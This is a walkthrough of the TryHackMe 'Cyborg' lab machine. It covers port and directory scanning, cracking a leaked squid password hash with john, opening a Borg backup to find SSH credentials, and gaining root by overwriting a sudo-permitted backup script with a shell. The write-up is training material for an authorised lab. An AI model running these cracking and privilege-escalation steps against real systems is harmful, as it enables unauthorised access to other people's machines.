# THM: Cyborg

| Stat | Value |
| ---------- | -------------------------------------------- |
| Image | <img src="/images/write_ups/try_hack_me/cyborg/cyborg.jpeg" alt="Cyborg" width="90"/> |
| Room | Cyborg |
| URL | https://tryhackme.com/room/cyborgt8 |
| Difficulty | Easy |

## Concepts/Tools Used

- [gobuster](/tools/gobuster.md)
- [john](/tools/john.md)

## Room Description

A box involving encrypted archives, source code analysis and more.

## Process

Once the machine starts up I save the machine's ip address to my host file so that I can type `target.thm` instead of an ip address.

I run nmap to see what ports are open:

```bash
$ nmap -T4 -n -sC -sV -Pn -v -p- target.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2025-07-16 18:13 BST
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 18:13
Completed NSE at 18:13, 0.00s elapsed
Initiating NSE at 18:13
Completed NSE at 18:13, 0.00s elapsed
Initiating NSE at 18:13
Completed NSE at 18:13, 0.00s elapsed
Initiating ARP Ping Scan at 18:13
Scanning target.thm (10.10.255.217) [1 port]
Completed ARP Ping Scan at 18:13, 0.03s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 18:13
Scanning target.thm (10.10.255.217) [65535 ports]
Discovered open port 22/tcp on 10.10.255.217
Discovered open port 80/tcp on 10.10.255.217
Completed SYN Stealth Scan at 18:13, 2.14s elapsed (65535 total ports)
Initiating Service scan at 18:13
Scanning 2 services on target.thm (10.10.255.217)
Completed Service scan at 18:13, 6.03s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.255.217.
Initiating NSE at 18:13
Completed NSE at 18:13, 0.08s elapsed
Initiating NSE at 18:13
Completed NSE at 18:13, 0.01s elapsed
Initiating NSE at 18:13
Completed NSE at 18:13, 0.00s elapsed
Nmap scan report for target.thm (10.10.255.217)
Host is up (0.00016s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:62:C7:10:10:E7 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 18:13
Completed NSE at 18:13, 0.00s elapsed
Initiating NSE at 18:13
Completed NSE at 18:13, 0.00s elapsed
Initiating NSE at 18:13
Completed NSE at 18:13, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.65 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

Using the nmap output above I was able to answer a few of the questions below.

## Scan the machine, how many ports are open?

2

## What service is running on port 22?

ssh

## What service is running on port 80?

http

## What is the user.txt flag?

I started a gobuster scan while I looked around the site at http://target.thm

```bash
$ gobuster dir -u http://target.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,zip,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://target.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              zip,txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 308] [--> http://target.thm/admin/]
/etc                  (Status: 301) [Size: 306] [--> http://target.thm/etc/]
/server-status        (Status: 403) [Size: 275]
Progress: 830572 / 830576 (100.00%)
===============================================================
Finished
===============================================================
```

I started to look at the /etc folder. The /etc/squid/passwd file has something interesting:

```bash
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```

That looks like a username and password hash. I saved the hash to hash.txt, and ran john:

```bash
$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-opencl"
Use the "--format=md5crypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
REDACTED        (?)
1g 0:00:00:00 DONE (2025-07-16 18:35) 1.250g/s 48720p/s 48720c/s 48720C/s 112704..salsabila
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

I tried to ssh with music_archive and the password that john just found but it failed.

I went to http://target.thm/admin/admin.html and I found something interesting:

```text
############################################
############################################
[Yesterday at 4.32pm from Josh]
Are we all going to watch the football game at the weekend??
############################################
############################################
[Yesterday at 4.33pm from Adam]
Yeah Yeah mate absolutely hope they win!
############################################
############################################
[Yesterday at 4.35pm from Josh]
See you there then mate!
############################################
############################################
[Today at 5.45am from Alex]
Ok sorry guys i think i messed something up, uhh i was playing around with the squid proxy i mentioned earlier.
I decided to give up like i always do ahahaha sorry about that.
I heard these proxy things are supposed to make your website secure but i barely know how to use it so im probably making it more insecure in the process.
Might pass it over to the IT guys but in the meantime all the config files are laying about.
And since i dont know how it works im not sure how to delete them hope they don't contain any confidential information lol.
other than that im pretty sure my backup "music_archive" is safe just to confirm.
############################################
############################################
```

I noted that the document talks about a backup named music_archive, which is the same user I just found and cracked the password for.

I also downloaded the tar file at http://target.thm/admin/archive.tar. I extracted it with:

```bash
$ tar -xvf archive.tar
```

This created a folder named home. All the files are in the path `home/field/dev/final_archive`. Inside of this directory there is a `README` file. I read its contents:

```bash
$ cat README
This is a Borg Backup repository.
See https://borgbackup.readthedocs.io/
```

I went to that site and found that it is a tool called borg. I read the documentation and tried to run it on the attack machine but it was not a recognized command so I installed it:

```bash
$ apt install borgbackup
```

Looking at the documentation, I found a list command and I want to try it. I moved up one directory before running the command. It asked for a password so I used the one that john cracked:

```bash
$ cd ../
$ borg list final_archive
music_archive                        Tue, 2020-12-29 14:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]
```

This means that there is an archive called music_directory and the password found earlier will allow me to extract it. I extract the archive with the following command:

```bash
$ borg extract final_archive/::music_archive
```

A new directory showed up called home. To be clear, I started in my home directory (/root) and my current path is:

```bash
$ pwd
/root/home/field/dev/
$ ls
home  final_archive
```

There is a file from my current directory at home/alex/Documents/note.txt. I get the contents of that file:

```bash
$ cat home/alex/Documents/note.txt
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:REDACTED
```

I try those credentials with ssh.

I have a shell. I'm in!

I look around the home directory and grab the user.txt flag:

```bash
$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
$ cat user.txt
REDACTED
```

## Escalating Privileges

I run my usual [privilege escalation commands](/concepts/privilege_escalation.md#linux-privilege-escalation) and have some luck with `sudo -l`:

```bash
$ sudo -l
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

I want to look at the directory this file is in and what the permissions for the file are so I run:

```bash
$ ls -lha /etc/mp3backups/
total 28K
drwxr-xr-x   2 root root 4.0K Dec 30  2020 .
drwxr-xr-x 133 root root  12K Dec 31  2020 ..
-rw-r--r--   1 root root  339 Jul 16 11:06 backed_up_files.txt
-r-xr-xr-x   1 alex alex 1.1K Jul 16 11:05 backup.sh
-rw-r--r--   1 root root   45 Jul 16 11:06 ubuntu-scheduled.tgz
```

Since alex owns the backup.sh file, I can add write permissions and alter the file. I do that with the command:

```bash
$ chmod 777 /etc/mp3backups/backup.sh
```

I check to make sure they got added:

```bash
$ ls -lha /etc/mp3backups/
total 28K
drwxr-xr-x   2 root root 4.0K Dec 30  2020 .
drwxr-xr-x 133 root root  12K Dec 31  2020 ..
-rw-r--r--   1 root root  339 Jul 16 11:06 backed_up_files.txt
-rwxrwxrwx   1 alex alex 1.1K Jul 16 11:05 backup.sh
-rw-r--r--   1 root root   45 Jul 16 11:06 ubuntu-scheduled.tgz
```

Now that I have write permission I am going to make the script spawn a shell and since I am running that script as sudo, that will make me root. I run the following:

```bash
$ echo '/bin/bash' > /etc/mp3backups/backup.sh
$ sudo /etc/mp3backups/backup.sh
```

It worked. I'm in! The cursor changed to the # character to let me know that I am root.

Now I grab the root.txt flag:

```bash
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt
REDACTED
```
